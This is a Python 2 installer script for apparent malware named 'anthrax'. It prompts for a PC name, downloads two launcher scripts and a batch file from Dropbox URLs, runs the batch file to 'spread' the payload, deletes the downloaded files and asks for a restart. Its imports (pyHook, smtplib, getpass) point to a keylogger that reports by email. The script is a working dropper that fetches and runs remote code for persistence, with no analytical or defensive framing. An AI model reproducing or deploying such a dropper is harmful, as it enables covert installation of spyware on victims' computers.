#version 1.0
#config--------------------
subject_name = 'debug4.1'
subject_file = 'C://Python27/name.txt'
interval = 500
crypt_key = 69
#--------------------------
import pyHook, pythoncom, sys, logging, os, smtplib, socket, getpass, time
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import Encoders
import sched
import urllib2, urllib, shutil
from win32com.shell import shell, shellcon
from subprocess import Popen
#--------------------------
i = raw_input('Enter PC name: ')
f = open(subject_file,'w')
f.write(i)
f.close()
#f = open(subject_file,'r')
#r = f.read()
#f.close()
#print r
#--------------------------
url_l1 = "https://dl.dropboxusercontent.com/u/42966918/anthrax/anthrax_launcher/anthrax_launcher.pyw?dl=1" 
url_l2 = "https://dl.dropboxusercontent.com/u/42966918/anthrax/anthrax_launcher/anthrax_launcher2.pyw?dl=1"
url_ins = "https://dl.dropboxusercontent.com/u/42966918/anthrax/anthrax_launcher/mv.bat?dl=1"
print 'Downloading Launcher1...',
l1 = urllib.URLopener()
l1.retrieve(url_l1, "anthrax_launcher.pyw")
print 'Done'
print 'Downloading Launcher2...',
l1 = urllib.URLopener()
l1.retrieve(url_l1, "anthrax_launcher2.pyw")
print 'Done'
print 'Downloading installer...',
b = urllib.URLopener()
b.retrieve(url_ins, "mv.bat")
print 'Done'
print 'Spreading Anthrax...',
p = Popen("mv.bat")
stdout, stderr = p.communicate()
print 'Done'
print 'Cleaning up...',
os.remove('anthrax_launcher.pyw')
os.remove('anthrax_launcher2.pyw')
os.remove('mv.bat')
print 'Done'
print 'Restart computer to enable'
i = raw_input('Press enter to close')
